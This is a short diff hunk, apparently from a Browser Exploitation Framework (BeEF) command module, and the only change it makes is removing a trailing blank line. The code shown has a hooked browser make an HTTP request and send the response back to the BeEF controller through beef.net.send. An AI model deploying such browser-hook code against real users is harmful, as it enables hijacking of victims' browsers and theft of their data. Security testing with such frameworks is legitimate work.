@@ -19,4 +19,3 @@ beef.execute(function() {
 	beef.net.request(scheme, method, domain, port, path, anchor, data, timeout, dataType, function(response) { beef.net.send("<%= @command_url %>", <%= @command_id %>, JSON.stringify(response)); } );
 
 });
-
